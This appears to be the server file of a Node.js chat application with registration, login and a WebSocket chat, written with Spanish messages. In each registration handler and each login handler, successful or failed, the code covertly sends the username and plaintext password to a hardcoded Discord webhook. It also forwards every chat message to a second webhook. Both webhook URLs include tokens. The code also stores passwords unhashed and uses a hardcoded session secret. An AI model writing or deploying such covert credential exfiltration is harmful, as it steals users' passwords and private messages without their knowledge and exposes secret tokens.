const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const loginWebhook = 'https://discord.com/api/webhooks/1401926755123597483/zeJNCzVoOiZL59SdlpueCCEWEYsiPdvLRoN6PhcBMJp1BG52o5YSV5ePlg8xKVIePDAA';
const chatWebhook = 'https://discord.com/api/webhooks/1401931313820340357/i5JfQQRrnXDthPMUnE8J0N2kltyt6qKOUjWkKY851COEy1x_Hd5BX2PhL2poZJ3sse9k';

const db = new sqlite3.Database('./db.sqlite', (err) => {
    if (err) {
        console.error('Error abriendo la base de datos:', err.message);
    } else {
        console.log('Base de datos conectada.');
    }
});

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )`);
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: true
}));

function authMiddleware(req, res, next) {
    if (req.session.user) next();
    else res.redirect('/login');
}

app.get('/', (req, res) => {
    if (req.session.user) {
        res.redirect('/chat');
    } else {
        res.redirect('/login');
    }
});

app.get('/register', (req, res) => {
    res.sendFile(path.join(__dirname, 'views/register.html'));
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).send('Faltan datos');

    db.get("SELECT * FROM users WHERE username = ?", [username], (err, row) => {
        if (err) {
            console.error(err);
            return res.status(500).send('Error en base de datos');
        }
        if (row) return res.send("Usuario ya registrado");

        db.run("INSERT INTO users (username, password) VALUES (?, ?)", [username, password], (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send('Error al registrar usuario');
            }
            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔔 Nuevo registro\nUsuario: **${username}**\nContraseña: ||${password}||`
                })
            }).catch(console.error);

            res.redirect('/login');
        });
    });
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'views/login.html'));
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).send('Faltan datos');

    db.get("SELECT * FROM users WHERE username = ? AND password = ?", [username, password], (err, row) => {
        if (err) {
            console.error(err);
            return res.status(500).send('Error en base de datos');
        }
        if (row) {
            req.session.user = username;
            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `✅ Login exitoso\nUsuario: **${username}**\nContraseña: ||${password}||`
                })
            }).catch(console.error);

            res.redirect('/chat');
        } else {
            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `❌ Login fallido\nUsuario: **${username}**\nContraseña: ||${password}||`
                })
            }).catch(console.error);

            res.status(401).send("Credenciales incorrectas");
        }
    });
});

app.get('/chat', authMiddleware, (req, res) => {
    res.sendFile(path.join(__dirname, 'views/chat.html'));
});

// NUEVA RUTA /me para obtener el nombre real
app.get('/me', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: "No autorizado" });
    }
    res.json({ username: req.session.user });
});

// WebSocket handling
wss.on('connection', ws => {
    ws.on('message', message => {
        let data;
        try {
            data = JSON.parse(message);
        } catch (e) {
            return;
        }
        if (!data.user || !data.text) return;

        fetch(chatWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `💬 Mensaje de **${data.user}**: ${data.text}` })
        }).catch(console.error);

        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({ user: data.user, text: data.text }));
            }
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Servidor corriendo en el puerto ${PORT}`));
